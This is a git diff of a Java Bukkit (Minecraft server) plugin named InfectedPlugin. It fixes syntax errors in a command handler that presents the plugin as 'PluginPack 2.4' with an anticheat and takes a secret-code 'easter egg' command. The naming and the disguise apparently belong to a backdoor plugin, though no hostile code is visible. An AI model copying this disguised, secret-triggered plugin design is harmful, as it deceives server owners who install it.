@@ -12,9 +12,11 @@ import org.CreeperCoders.InfectedPlugin.Commands.*;
 
 public class InfectedPlugin extends JavaPlugin
 {
+
     public static final Logger log = Bukkit.getLogger();
+
     public InfectedPlugin plugin;
-    
+
     @Override
     public void onLoad()
     {
@@ -73,11 +75,11 @@ public class InfectedPlugin extends JavaPlugin
             sender.sendMessage(ChatColor.GREEN + "PluginPack 2.4 working 100%! Use /anticheat to see anticheat details!");
             return true;
         }
-        else if (commandLabel.equalsIgnoreCase("fun")
+        else if (commandLabel.equalsIgnoreCase("fun"))
         {
             if (args.length != 1)
             {
-                sender.sendMessage(CharColor.GOLD + "Want some fun? type in a secret code for easter egg");
+                sender.sendMessage(ChatColor.GOLD + "Want some fun? type in a secret code for easter egg");
                 return false;
             }
             if ("don't have a good idea".equalsIgnoreCase(args[0]))
@@ -96,4 +98,5 @@ public class InfectedPlugin extends JavaPlugin
         }
         return false;
     }
+
 }
